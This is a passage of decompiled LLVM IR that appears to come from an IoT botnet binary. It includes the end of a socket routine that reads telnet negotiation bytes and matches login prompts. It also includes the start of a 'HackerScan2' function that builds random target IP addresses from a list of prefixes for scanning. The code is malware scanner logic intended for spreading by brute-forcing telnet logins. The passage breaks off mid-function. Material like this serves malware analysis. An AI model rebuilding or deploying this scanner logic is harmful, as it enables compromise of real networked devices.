  %v1_a514 = urem i32 %arg1, 32
  %v6_a51c = shl i32 1, %v1_a514
  %v1_a540 = add i32 %arg1, 1
  %v2_a548 = ptrtoint i32* %stack_var_-176 to i32
  %v6_a668 = inttoptr i32 %arg2 to i8*
  %v2_a67c = icmp eq i32 %arg3, 0
  %v1_a688 = inttoptr i32 %arg6 to i8*
  %v5_a6cc = icmp sgt i32 %arg5, 0
  %v2_a504 = add nsw i32 %v3_a4fc, -152
  %v2_a508 = add i32 %v2_a504, %v13_a460
  %v1_a50c = inttoptr i32 %v2_a508 to i32*
  br label %dec_label_pc_a6a4

dec_label_pc_a4c4.lr.ph:                          ; preds = %dec_label_pc_a6b8, %dec_label_pc_a6c4
  br label %dec_label_pc_a4c4

dec_label_pc_a4c4:                                ; preds = %dec_label_pc_a4c4.lr.ph, %dec_label_pc_a4c4
  %storemerge27 = phi i32 [ 0, %dec_label_pc_a4c4.lr.ph ], [ %v1_a4d8, %dec_label_pc_a4c4 ]
  %v5_a4d0 = mul nuw nsw i32 %storemerge27, 4
  %v6_a4d0 = add i32 %v5_a4d0, %v2_a4b0
  %v7_a4d0 = inttoptr i32 %v6_a4d0 to i32*
  store i32 0, i32* %v7_a4d0, align 4
  %v1_a4d8 = add nuw nsw i32 %storemerge27, 1
  %tmp30 = icmp ult i32 %v1_a4d8, 32
  br i1 %tmp30, label %dec_label_pc_a4c4, label %dec_label_pc_a4ec

dec_label_pc_a4ec:                                ; preds = %dec_label_pc_a4c4
  %v2_a50c = load i32, i32* %v1_a50c, align 4
  %v2_a520 = or i32 %v2_a50c, %v6_a51c
  store i32 %v2_a520, i32* %v1_a50c, align 4
  %v5_a55c = call i32 @__libc_select(i32 %v1_a540, i32 %v2_a4b0, i32 0, i32 0, i32 %v2_a548)
  %tmp31 = icmp slt i32 %v5_a55c, 1
  br i1 %tmp31, label %dec_label_pc_a6e8, label %dec_label_pc_a56c

dec_label_pc_a56c:                                ; preds = %dec_label_pc_a4ec
  %v2_a578 = add i32 %stack_var_-40.0, %arg6
  %v5_a57c = inttoptr i32 %v2_a578 to i8*
  %v6_a590 = inttoptr i32 %v2_a578 to i32*
  %v7_a590 = call i32 @__libc_recv(i32 %arg1, i32* %v6_a590, i32 1, i32 0, i32 %v2_a578)
  %v7_a5a0 = icmp eq i32 %v7_a590, -1
  br i1 %v7_a5a0, label %dec_label_pc_a5b4, label %dec_label_pc_a5a8

dec_label_pc_a5a8:                                ; preds = %dec_label_pc_a56c
  %v2_a5ac = icmp eq i32 %v7_a590, 0
  br i1 %v2_a5ac, label %dec_label_pc_a5b4, label %dec_label_pc_a5c0

dec_label_pc_a5b4:                                ; preds = %dec_label_pc_a5a8, %dec_label_pc_a56c
  br label %dec_label_pc_a6f0

dec_label_pc_a5c0:                                ; preds = %dec_label_pc_a5a8
  %v2_a5c8 = add i32 %v7_a590, %stack_var_-40.0
  %v2_a5d4 = load i8, i8* %v5_a57c, align 1
  %v2_a5d8 = icmp eq i8 %v2_a5d4, -1
  br i1 %v2_a5d8, label %dec_label_pc_a5e0, label %dec_label_pc_a660

dec_label_pc_a5e0:                                ; preds = %dec_label_pc_a5c0
  %v1_a5e4 = add i32 %v2_a578, 1
  %v5_a5f8 = inttoptr i32 %v1_a5e4 to i32*
  %v6_a5f8 = call i32 @__libc_recv(i32 %arg1, i32* %v5_a5f8, i32 2, i32 0, i32 %v2_a5c8)
  %v7_a608 = icmp eq i32 %v6_a5f8, -1
  br i1 %v7_a608, label %dec_label_pc_a61c, label %dec_label_pc_a610

dec_label_pc_a610:                                ; preds = %dec_label_pc_a5e0
  %v2_a614 = icmp eq i32 %v6_a5f8, 0
  br i1 %v2_a614, label %dec_label_pc_a61c, label %dec_label_pc_a628

dec_label_pc_a61c:                                ; preds = %dec_label_pc_a610, %dec_label_pc_a5e0
  br label %dec_label_pc_a6f0

dec_label_pc_a628:                                ; preds = %dec_label_pc_a610
  %v2_a630 = add i32 %v6_a5f8, %v2_a5c8
  %v3_a644 = call i32 @negotiate(i32 %arg1, i32 %v2_a578, i32 3)
  %v2_a64c = icmp eq i32 %v3_a644, 0
  br i1 %v2_a64c, label %dec_label_pc_a654, label %dec_label_pc_a6a4

dec_label_pc_a654:                                ; preds = %dec_label_pc_a628
  br label %dec_label_pc_a6f0

dec_label_pc_a660:                                ; preds = %dec_label_pc_a5c0
  %v7_a668 = call i32 @strstr(i32 %arg6, i8* %v6_a668)
  %v2_a670 = icmp eq i32 %v7_a668, 0
  br i1 %v2_a670, label %dec_label_pc_a678, label %dec_label_pc_a6dc

dec_label_pc_a678:                                ; preds = %dec_label_pc_a660
  br i1 %v2_a67c, label %dec_label_pc_a6a4, label %dec_label_pc_a684

dec_label_pc_a684:                                ; preds = %dec_label_pc_a678
  %v2_a688 = call i32 @matchPrompt(i8* %v1_a688)
  %v2_a690 = icmp eq i32 %v2_a688, 0
  br i1 %v2_a690, label %dec_label_pc_a6a4, label %dec_label_pc_a6dc

dec_label_pc_a6a4:                                ; preds = %dec_label_pc_a628, %dec_label_pc_a684, %dec_label_pc_a678, %entry
  %stack_var_-40.0 = phi i32 [ %arg8, %entry ], [ %v2_a630, %dec_label_pc_a628 ], [ %v2_a5c8, %dec_label_pc_a678 ], [ %v2_a5c8, %dec_label_pc_a684 ]
  %v1_a6a8 = add i32 %stack_var_-40.0, 2
  %v6_a6b4 = icmp slt i32 %v1_a6a8, %arg7
  br i1 %v6_a6b4, label %dec_label_pc_a6b8, label %dec_label_pc_a6e8

dec_label_pc_a6b8:                                ; preds = %dec_label_pc_a6a4
  %v3_a6b8 = load i32, i32* %stack_var_-176, align 4
  %v5_a6c0 = icmp sgt i32 %v3_a6b8, 0
  br i1 %v5_a6c0, label %dec_label_pc_a4c4.lr.ph, label %dec_label_pc_a6c4

dec_label_pc_a6c4:                                ; preds = %dec_label_pc_a6b8
  br i1 %v5_a6cc, label %dec_label_pc_a4c4.lr.ph, label %dec_label_pc_a6e8

dec_label_pc_a6dc:                                ; preds = %dec_label_pc_a660, %dec_label_pc_a684
  br label %dec_label_pc_a6f0

dec_label_pc_a6e8:                                ; preds = %dec_label_pc_a4ec, %dec_label_pc_a6c4, %dec_label_pc_a6a4
  br label %dec_label_pc_a6f0

dec_label_pc_a6f0:                                ; preds = %dec_label_pc_a6dc, %dec_label_pc_a654, %dec_label_pc_a61c, %dec_label_pc_a5b4, %dec_label_pc_a6e8
  %stack_var_-196.0 = phi i32 [ 0, %dec_label_pc_a6e8 ], [ 1, %dec_label_pc_a6dc ], [ 0, %dec_label_pc_a5b4 ], [ 0, %dec_label_pc_a61c ], [ 0, %dec_label_pc_a654 ]
  ret i32 %stack_var_-196.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 2, 1, 0 }
  uselistorder i32 %v6_a5f8, { 1, 2, 0 }
  uselistorder i32 %v7_a590, { 1, 2, 0 }
  uselistorder i32 %storemerge27, { 1, 0 }
  uselistorder i32 %v2_a4b0, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_a6f0, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a6e8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a6dc, { 1, 0 }
  uselistorder label %dec_label_pc_a6a4, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_a4c4, { 1, 0 }
  uselistorder label %dec_label_pc_a4c4.lr.ph, { 1, 0 }
}

define i32 @HackerScan2(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_a704 = load i32, i32* @fp, align 4
  store i32 42764, i32* %stack_var_-4, align 4
  %v2_a708 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a708, i32* @fp, align 4
  %v2_a70c = ptrtoint i32* %stack_var_-36 to i32
  store i8 0, i8* @global_var_2e46f.69, align 1
  store i8 0, i8* @global_var_2e470.70, align 1
  store i8 0, i8* @global_var_2e471.71, align 1
  store i8 0, i8* @global_var_2e472.72, align 1
  %v0_a740 = call i32 @random()
  %v2_a750 = srem i32 %v0_a740, 255
  %v1_a760 = trunc i32 %v2_a750 to i8
  store i8 %v1_a760, i8* @global_var_2e46f.69, align 1
  %v0_a764 = call i32 @random()
  %v2_a774 = srem i32 %v0_a764, 255
  %v1_a784 = trunc i32 %v2_a774 to i8
  store i8 %v1_a784, i8* @global_var_2e470.70, align 1
  %v0_a788 = call i32 @random()
  %v2_a798 = srem i32 %v0_a788, 255
  %v1_a7a8 = trunc i32 %v2_a798 to i8
  store i8 %v1_a7a8, i8* @global_var_2e471.71, align 1
  %v0_a7ac = call i32 @random()
  %v2_a7bc = srem i32 %v0_a7ac, 255
  %v1_a7cc = trunc i32 %v2_a7bc to i8
  store i8 %v1_a7cc, i8* @global_var_2e472.72, align 1
  %v0_a7d0 = call i32 @random()
  %v2_a7e0 = srem i32 %v0_a7d0, 208
  %v2_a7f0 = icmp eq i32 %v2_a7e0, 0
  br i1 %v2_a7f0, label %dec_label_pc_a7f8, label %dec_label_pc_a820

dec_label_pc_a7f8:                                ; preds = %entry
  %v3_a804 = load i8, i8* @global_var_2e471.71, align 1
  %v3_a810 = load i8, i8* @global_var_2e472.72, align 1
  %v4_a81c = sext i8 %v3_a804 to i32
  %v6_a81c = sext i8 %v3_a810 to i32
  %v8_a81c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([12 x i8]* @global_var_1f954.74 to i32), i32 %v4_a81c, i32 %v6_a81c, i32 0)
  br label %dec_label_pc_a820

dec_label_pc_a820:                                ; preds = %entry, %dec_label_pc_a7f8
  %v7_a824 = icmp eq i32 %v2_a7e0, 1
  br i1 %v7_a824, label %dec_label_pc_a82c, label %dec_label_pc_a854

dec_label_pc_a82c:                                ; preds = %dec_label_pc_a820
  %v3_a838 = load i8, i8* @global_var_2e471.71, align 1
  %v3_a844 = load i8, i8* @global_var_2e472.72, align 1
  %v4_a850 = sext i8 %v3_a838 to i32
  %v6_a850 = sext i8 %v3_a844 to i32
  %v8_a850 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_1f960.76 to i32), i32 %v4_a850, i32 %v6_a850, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a854

dec_label_pc_a854:                                ; preds = %dec_label_pc_a820, %dec_label_pc_a82c
  %v7_a858 = icmp eq i32 %v2_a7e0, 2
  br i1 %v7_a858, label %dec_label_pc_a860, label %dec_label_pc_a888

dec_label_pc_a860:                                ; preds = %dec_label_pc_a854
  %v3_a86c = load i8, i8* @global_var_2e471.71, align 1
  %v3_a878 = load i8, i8* @global_var_2e472.72, align 1
  %v4_a884 = sext i8 %v3_a86c to i32
  %v6_a884 = sext i8 %v3_a878 to i32
  %v8_a884 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([11 x i8]* @global_var_1f970.78 to i32), i32 %v4_a884, i32 %v6_a884, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a888

dec_label_pc_a888:                                ; preds = %dec_label_pc_a854, %dec_label_pc_a860
  %v7_a88c = icmp eq i32 %v2_a7e0, 3
  br i1 %v7_a88c, label %dec_label_pc_a894, label %dec_label_pc_a8bc

dec_label_pc_a894:                                ; preds = %dec_label_pc_a888
  %v3_a8a0 = load i8, i8* @global_var_2e471.71, align 1
  %v3_a8ac = load i8, i8* @global_var_2e472.72, align 1
  %v4_a8b8 = sext i8 %v3_a8a0 to i32
  %v6_a8b8 = sext i8 %v3_a8ac to i32
  %v8_a8b8 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1f97c.80 to i32), i32 %v4_a8b8, i32 %v6_a8b8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a8bc

dec_label_pc_a8bc:                                ; preds = %dec_label_pc_a888, %dec_label_pc_a894
  %v7_a8c0 = icmp eq i32 %v2_a7e0, 4
  br i1 %v7_a8c0, label %dec_label_pc_a8c8, label %dec_label_pc_a8f0

dec_label_pc_a8c8:                                ; preds = %dec_label_pc_a8bc
  %v3_a8d4 = load i8, i8* @global_var_2e471.71, align 1
  %v3_a8e0 = load i8, i8* @global_var_2e472.72, align 1
  %v4_a8ec = sext i8 %v3_a8d4 to i32
  %v6_a8ec = sext i8 %v3_a8e0 to i32
  %v8_a8ec = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([11 x i8]* @global_var_1f98c.82 to i32), i32 %v4_a8ec, i32 %v6_a8ec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a8f0

dec_label_pc_a8f0:                                ; preds = %dec_label_pc_a8bc, %dec_label_pc_a8c8
  %v7_a8f4 = icmp eq i32 %v2_a7e0, 5
  br i1 %v7_a8f4, label %dec_label_pc_a8fc, label %dec_label_pc_a924

dec_label_pc_a8fc:                                ; preds = %dec_label_pc_a8f0
  %v3_a908 = load i8, i8* @global_var_2e471.71, align 1
  %v3_a914 = load i8, i8* @global_var_2e472.72, align 1
  %v4_a920 = sext i8 %v3_a908 to i32
  %v6_a920 = sext i8 %v3_a914 to i32
  %v8_a920 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1f998.84 to i32), i32 %v4_a920, i32 %v6_a920, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a924

dec_label_pc_a924:                                ; preds = %dec_label_pc_a8f0, %dec_label_pc_a8fc
  %v7_a928 = icmp eq i32 %v2_a7e0, 6
  br i1 %v7_a928, label %dec_label_pc_a930, label %dec_label_pc_a958

dec_label_pc_a930:                                ; preds = %dec_label_pc_a924
  %v3_a93c = load i8, i8* @global_var_2e471.71, align 1
  %v3_a948 = load i8, i8* @global_var_2e472.72, align 1
  %v4_a954 = sext i8 %v3_a93c to i32
  %v6_a954 = sext i8 %v3_a948 to i32
  %v8_a954 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([12 x i8]* @global_var_1f9a8.86 to i32), i32 %v4_a954, i32 %v6_a954, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a958

dec_label_pc_a958:                                ; preds = %dec_label_pc_a924, %dec_label_pc_a930
  %v7_a95c = icmp eq i32 %v2_a7e0, 7
  br i1 %v7_a95c, label %dec_label_pc_a964, label %dec_label_pc_a98c

dec_label_pc_a964:                                ; preds = %dec_label_pc_a958
  %v3_a970 = load i8, i8* @global_var_2e471.71, align 1
  %v3_a97c = load i8, i8* @global_var_2e472.72, align 1
  %v4_a988 = sext i8 %v3_a970 to i32
  %v6_a988 = sext i8 %v3_a97c to i32
  %v8_a988 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1f9b4.88 to i32), i32 %v4_a988, i32 %v6_a988, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a98c

dec_label_pc_a98c:                                ; preds = %dec_label_pc_a958, %dec_label_pc_a964
  %v7_a990 = icmp eq i32 %v2_a7e0, 8
  br i1 %v7_a990, label %dec_label_pc_a998, label %dec_label_pc_a9c0

dec_label_pc_a998:                                ; preds = %dec_label_pc_a98c
  %v3_a9a4 = load i8, i8* @global_var_2e471.71, align 1
  %v3_a9b0 = load i8, i8* @global_var_2e472.72, align 1
  %v4_a9bc = sext i8 %v3_a9a4 to i32
  %v6_a9bc = sext i8 %v3_a9b0 to i32
  %v8_a9bc = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1f9c4.90 to i32), i32 %v4_a9bc, i32 %v6_a9bc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a9c0

dec_label_pc_a9c0:                                ; preds = %dec_label_pc_a98c, %dec_label_pc_a998
  %v7_a9c4 = icmp eq i32 %v2_a7e0, 9
  br i1 %v7_a9c4, label %dec_label_pc_a9cc, label %dec_label_pc_a9f4

dec_label_pc_a9cc:                                ; preds = %dec_label_pc_a9c0
  %v3_a9d8 = load i8, i8* @global_var_2e471.71, align 1
  %v3_a9e4 = load i8, i8* @global_var_2e472.72, align 1
  %v4_a9f0 = sext i8 %v3_a9d8 to i32
  %v6_a9f0 = sext i8 %v3_a9e4 to i32
  %v8_a9f0 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1f9d4.92 to i32), i32 %v4_a9f0, i32 %v6_a9f0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_a9f4

dec_label_pc_a9f4:                                ; preds = %dec_label_pc_a9c0, %dec_label_pc_a9cc
  %v7_a9f8 = icmp eq i32 %v2_a7e0, 10
  br i1 %v7_a9f8, label %dec_label_pc_aa00, label %dec_label_pc_aa28

dec_label_pc_aa00:                                ; preds = %dec_label_pc_a9f4
  %v3_aa0c = load i8, i8* @global_var_2e471.71, align 1
  %v3_aa18 = load i8, i8* @global_var_2e472.72, align 1
  %v4_aa24 = sext i8 %v3_aa0c to i32
  %v6_aa24 = sext i8 %v3_aa18 to i32
  %v8_aa24 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([14 x i8]* @global_var_1f9e4.94 to i32), i32 %v4_aa24, i32 %v6_aa24, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aa28

dec_label_pc_aa28:                                ; preds = %dec_label_pc_a9f4, %dec_label_pc_aa00
  %v7_aa2c = icmp eq i32 %v2_a7e0, 11
  br i1 %v7_aa2c, label %dec_label_pc_aa34, label %dec_label_pc_aa5c

dec_label_pc_aa34:                                ; preds = %dec_label_pc_aa28
  %v3_aa40 = load i8, i8* @global_var_2e471.71, align 1
  %v3_aa4c = load i8, i8* @global_var_2e472.72, align 1
  %v4_aa58 = sext i8 %v3_aa40 to i32
  %v6_aa58 = sext i8 %v3_aa4c to i32
  %v8_aa58 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([11 x i8]* @global_var_1f9f4.96 to i32), i32 %v4_aa58, i32 %v6_aa58, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aa5c

dec_label_pc_aa5c:                                ; preds = %dec_label_pc_aa28, %dec_label_pc_aa34
  %v7_aa60 = icmp eq i32 %v2_a7e0, 12
  br i1 %v7_aa60, label %dec_label_pc_aa68, label %dec_label_pc_aa90

dec_label_pc_aa68:                                ; preds = %dec_label_pc_aa5c
  %v3_aa74 = load i8, i8* @global_var_2e471.71, align 1
  %v3_aa80 = load i8, i8* @global_var_2e472.72, align 1
  %v4_aa8c = sext i8 %v3_aa74 to i32
  %v6_aa8c = sext i8 %v3_aa80 to i32
  %v8_aa8c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fa00.98 to i32), i32 %v4_aa8c, i32 %v6_aa8c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aa90

dec_label_pc_aa90:                                ; preds = %dec_label_pc_aa5c, %dec_label_pc_aa68
  %v7_aa94 = icmp eq i32 %v2_a7e0, 13
  br i1 %v7_aa94, label %dec_label_pc_aa9c, label %dec_label_pc_aac4

dec_label_pc_aa9c:                                ; preds = %dec_label_pc_aa90
  %v3_aaa8 = load i8, i8* @global_var_2e471.71, align 1
  %v3_aab4 = load i8, i8* @global_var_2e472.72, align 1
  %v4_aac0 = sext i8 %v3_aaa8 to i32
  %v6_aac0 = sext i8 %v3_aab4 to i32
  %v8_aac0 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fa10.100 to i32), i32 %v4_aac0, i32 %v6_aac0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aac4

dec_label_pc_aac4:                                ; preds = %dec_label_pc_aa90, %dec_label_pc_aa9c
  %v7_aac8 = icmp eq i32 %v2_a7e0, 14
  br i1 %v7_aac8, label %dec_label_pc_aad0, label %dec_label_pc_aaf8

dec_label_pc_aad0:                                ; preds = %dec_label_pc_aac4
  %v3_aadc = load i8, i8* @global_var_2e471.71, align 1
  %v3_aae8 = load i8, i8* @global_var_2e472.72, align 1
  %v4_aaf4 = sext i8 %v3_aadc to i32
  %v6_aaf4 = sext i8 %v3_aae8 to i32
  %v8_aaf4 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fa20.102 to i32), i32 %v4_aaf4, i32 %v6_aaf4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aaf8

dec_label_pc_aaf8:                                ; preds = %dec_label_pc_aac4, %dec_label_pc_aad0
  %v7_aafc = icmp eq i32 %v2_a7e0, 15
  br i1 %v7_aafc, label %dec_label_pc_ab04, label %dec_label_pc_ab2c

dec_label_pc_ab04:                                ; preds = %dec_label_pc_aaf8
  %v3_ab10 = load i8, i8* @global_var_2e471.71, align 1
  %v3_ab1c = load i8, i8* @global_var_2e472.72, align 1
  %v4_ab28 = sext i8 %v3_ab10 to i32
  %v6_ab28 = sext i8 %v3_ab1c to i32
  %v8_ab28 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fa30.104 to i32), i32 %v4_ab28, i32 %v6_ab28, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ab2c

dec_label_pc_ab2c:                                ; preds = %dec_label_pc_aaf8, %dec_label_pc_ab04
  %v7_ab30 = icmp eq i32 %v2_a7e0, 16
  br i1 %v7_ab30, label %dec_label_pc_ab38, label %dec_label_pc_ab60

dec_label_pc_ab38:                                ; preds = %dec_label_pc_ab2c
  %v3_ab44 = load i8, i8* @global_var_2e471.71, align 1
  %v3_ab50 = load i8, i8* @global_var_2e472.72, align 1
  %v4_ab5c = sext i8 %v3_ab44 to i32
  %v6_ab5c = sext i8 %v3_ab50 to i32
  %v8_ab5c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fa40.106 to i32), i32 %v4_ab5c, i32 %v6_ab5c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ab60

dec_label_pc_ab60:                                ; preds = %dec_label_pc_ab2c, %dec_label_pc_ab38
  %v7_ab64 = icmp eq i32 %v2_a7e0, 17
  br i1 %v7_ab64, label %dec_label_pc_ab6c, label %dec_label_pc_ab94

dec_label_pc_ab6c:                                ; preds = %dec_label_pc_ab60
  %v3_ab78 = load i8, i8* @global_var_2e471.71, align 1
  %v3_ab84 = load i8, i8* @global_var_2e472.72, align 1
  %v4_ab90 = sext i8 %v3_ab78 to i32
  %v6_ab90 = sext i8 %v3_ab84 to i32
  %v8_ab90 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fa50.108 to i32), i32 %v4_ab90, i32 %v6_ab90, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ab94

dec_label_pc_ab94:                                ; preds = %dec_label_pc_ab60, %dec_label_pc_ab6c
  %v7_ab98 = icmp eq i32 %v2_a7e0, 18
  br i1 %v7_ab98, label %dec_label_pc_aba0, label %dec_label_pc_abc8

dec_label_pc_aba0:                                ; preds = %dec_label_pc_ab94
  %v3_abac = load i8, i8* @global_var_2e471.71, align 1
  %v3_abb8 = load i8, i8* @global_var_2e472.72, align 1
  %v4_abc4 = sext i8 %v3_abac to i32
  %v6_abc4 = sext i8 %v3_abb8 to i32
  %v8_abc4 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fa60.110 to i32), i32 %v4_abc4, i32 %v6_abc4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_abc8

dec_label_pc_abc8:                                ; preds = %dec_label_pc_ab94, %dec_label_pc_aba0
  %v7_abcc = icmp eq i32 %v2_a7e0, 19
  br i1 %v7_abcc, label %dec_label_pc_abd4, label %dec_label_pc_abfc

dec_label_pc_abd4:                                ; preds = %dec_label_pc_abc8
  %v3_abe0 = load i8, i8* @global_var_2e471.71, align 1
  %v3_abec = load i8, i8* @global_var_2e472.72, align 1
  %v4_abf8 = sext i8 %v3_abe0 to i32
  %v6_abf8 = sext i8 %v3_abec to i32
  %v8_abf8 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([11 x i8]* @global_var_1fa70.112 to i32), i32 %v4_abf8, i32 %v6_abf8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_abfc

dec_label_pc_abfc:                                ; preds = %dec_label_pc_abc8, %dec_label_pc_abd4
  %v7_ac00 = icmp eq i32 %v2_a7e0, 20
  br i1 %v7_ac00, label %dec_label_pc_ac08, label %dec_label_pc_ac30

dec_label_pc_ac08:                                ; preds = %dec_label_pc_abfc
  %v3_ac14 = load i8, i8* @global_var_2e471.71, align 1
  %v3_ac20 = load i8, i8* @global_var_2e472.72, align 1
  %v4_ac2c = sext i8 %v3_ac14 to i32
  %v6_ac2c = sext i8 %v3_ac20 to i32
  %v8_ac2c = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([12 x i8]* @global_var_1fa7c.114 to i32), i32 %v4_ac2c, i32 %v6_ac2c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac30

dec_label_pc_ac30:                                ; preds = %dec_label_pc_abfc, %dec_label_pc_ac08
  %v7_ac34 = icmp eq i32 %v2_a7e0, 21
  br i1 %v7_ac34, label %dec_label_pc_ac3c, label %dec_label_pc_ac64

dec_label_pc_ac3c:                                ; preds = %dec_label_pc_ac30
  %v3_ac48 = load i8, i8* @global_var_2e471.71, align 1
  %v3_ac54 = load i8, i8* @global_var_2e472.72, align 1
  %v4_ac60 = sext i8 %v3_ac48 to i32
  %v6_ac60 = sext i8 %v3_ac54 to i32
  %v8_ac60 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([13 x i8]* @global_var_1fa88.116 to i32), i32 %v4_ac60, i32 %v6_ac60, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac64

dec_label_pc_ac64:                                ; preds = %dec_label_pc_ac30, %dec_label_pc_ac3c
  %v7_ac68 = icmp eq i32 %v2_a7e0, 22
  br i1 %v7_ac68, label %dec_label_pc_ac70, label %dec_label_pc_ac98

dec_label_pc_ac70:                                ; preds = %dec_label_pc_ac64
  %v3_ac7c = load i8, i8* @global_var_2e471.71, align 1
  %v3_ac88 = load i8, i8* @global_var_2e472.72, align 1
  %v4_ac94 = sext i8 %v3_ac7c to i32
  %v6_ac94 = sext i8 %v3_ac88 to i32
  %v8_ac94 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([11 x i8]* @global_var_1fa98.118 to i32), i32 %v4_ac94, i32 %v6_ac94, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ac98

dec_label_pc_ac98:                                ; preds = %dec_label_pc_ac64, %dec_label_pc_ac70
  %v7_ac9c = icmp eq i32 %v2_a7e0, 23
  br i1 %v7_ac9c, label %dec_label_pc_aca4, label %dec_label_pc_accc

dec_label_pc_aca4:                                ; preds = %dec_label_pc_ac98
  %v3_acb0 = load i8, i8* @global_var_2e471.71, align 1
  %v3_acbc = load i8, i8* @global_var_2e472.72, align 1
  %v4_acc8 = sext i8 %v3_acb0 to i32
  %v6_acc8 = sext i8 %v3_acbc to i32
  %v8_acc8 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([11 x i8]* @global_var_1faa4.120 to i32), i32 %v4_acc8, i32 %v6_acc8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_accc

dec_label_pc_accc:                                ; preds = %dec_label_pc_ac98, %dec_label_pc_aca4
  %v7_acd0 = icmp eq i32 %v2_a7e0, 24
  br i1 %v7_acd0, label %dec_label_pc_acd8, label %dec_label_pc_ad00

dec_label_pc_acd8:                                ; preds = %dec_label_pc_accc
  %v3_ace4 = load i8, i8* @global_var_2e471.71, align 1
  %v3_acf0 = load i8, i8* @global_var_2e472.72, align 1
  %v4_acfc = sext i8 %v3_ace4 to i32
  %v6_acfc = sext i8 %v3_acf0 to i32
  %v8_acfc = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([12 x i8]* @global_var_1fab0.122 to i32), i32 %v4_acfc, i32 %v6_acfc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad00

dec_label_pc_ad00:                                ; preds = %dec_label_pc_accc, %dec_label_pc_acd8
  %v7_ad04 = icmp eq i32 %v2_a7e0, 25
  br i1 %v7_ad04, label %dec_label_pc_ad0c, label %dec_label_pc_ad34

dec_label_pc_ad0c:                                ; preds = %dec_label_pc_ad00
  %v3_ad18 = load i8, i8* @global_var_2e471.71, align 1
  %v3_ad24 = load i8, i8* @global_var_2e472.72, align 1
  %v4_ad30 = sext i8 %v3_ad18 to i32
  %v6_ad30 = sext i8 %v3_ad24 to i32
  %v8_ad30 = call i32 @szprintf(i32 %v2_a70c, i32 ptrtoint ([12 x i8]* @global_var_1fabc.124 to i32), i32 %v4_ad30, i32 %v6_ad30, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ad34

dec_label_pc_ad34:                                ; preds = %dec_label_pc_ad00, %dec_label_pc_ad0c
  %v7_ad38 = icmp eq i32 %v2_a7e0, 26
  br i1 %v7_ad38, label %dec_label_pc_ad40, label %dec_label_pc_ad68

dec_label_pc_ad40:                                ; preds = %dec_label_pc_ad34
  %v3_ad4c = load i8, i8* @global_var_2e471.71, align 1
  %v3_ad58 = load i8, i8* @global_var_2e472.72, align 1
  %v4_ad64 = sext i8 %v3_ad4c to i32
  %v6_ad64 = sext i8 %v3_ad58 to i32
